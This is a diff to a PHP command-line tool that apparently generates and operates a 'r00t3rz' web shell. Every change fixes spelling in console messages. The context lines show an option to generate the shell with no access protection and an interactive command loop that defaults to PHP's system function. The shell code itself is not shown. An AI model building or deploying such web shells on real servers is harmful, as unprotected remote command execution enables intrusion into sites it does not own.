@@ -131,7 +131,7 @@ die($colors->getColoredString("\n\n\n\n","",""));
  }
  $secure = $argv[3];
   if(!$secure or $secure == "no" or $secure == "-n" or $secure == "--no"){
-  echo $colors->getColoredString("\n[!] You did not chose the secure r00t3rz Shell!.\n[+] Any one can open the shell in the browser.\n\n","light_red","");
+  echo $colors->getColoredString("\n[!] You did not choose the secure r00t3rz Shell!.\n[+] Any one can open the shell in the browser.\n\n","light_red","");
   echo $colors->getColoredString("\n\n\n[+] Please wait!\n[#] Generating the r00t3rz Shell without security ...\n\n","cyan","");
   sleep(3);
   $file = fopen($name,"w");
@@ -181,9 +181,9 @@ die($colors->getColoredString("\n\n\n\n","",""));
   }
  } else {
   echo $colors->getColoredString("\n[!] Error .. Pleas enter an acceptable value in security option!\n\n","light_red","");
-  echo $colors->getColoredString("[+] For generating the r00t3rz Shell with security chose: ","light_green","");
+  echo $colors->getColoredString("[+] For generating the r00t3rz Shell with security choice: ","light_green","");
   echo $colors->getColoredString("yes OR -y OR --yes\n","light_cyan","");
-  echo $colors->getColoredString("[+] For generating the r00t3rz Shell without security chose: ","light_green","");
+  echo $colors->getColoredString("[+] For generating the r00t3rz Shell without security choice: ","light_green","");
   echo $colors->getColoredString("no OR -n OR --no OR leave it blank\n\n\n\n","light_cyan","");
   die($colors->getColoredString("","",""));
  }
@@ -199,7 +199,7 @@ die($colors->getColoredString("\n\n\n\n","",""));
  $fun = $argv[3];
  if(!$fun){
   $fun = "system";
-  echo $colors->getColoredString("\n[!] You did not chose a function.\n[+] I will use the system funcion -> default function.\n\n","light_green","");
+  echo $colors->getColoredString("\n[!] You did not choose a function.\n[+] I will use the system function -> default function.\n\n","light_green","");
  }
  echo $colors->getColoredString("\n[!] For exit/quit type \"exit\" or \"close\" or \"quit\".\n\n","light_cyan","");
  while(1){
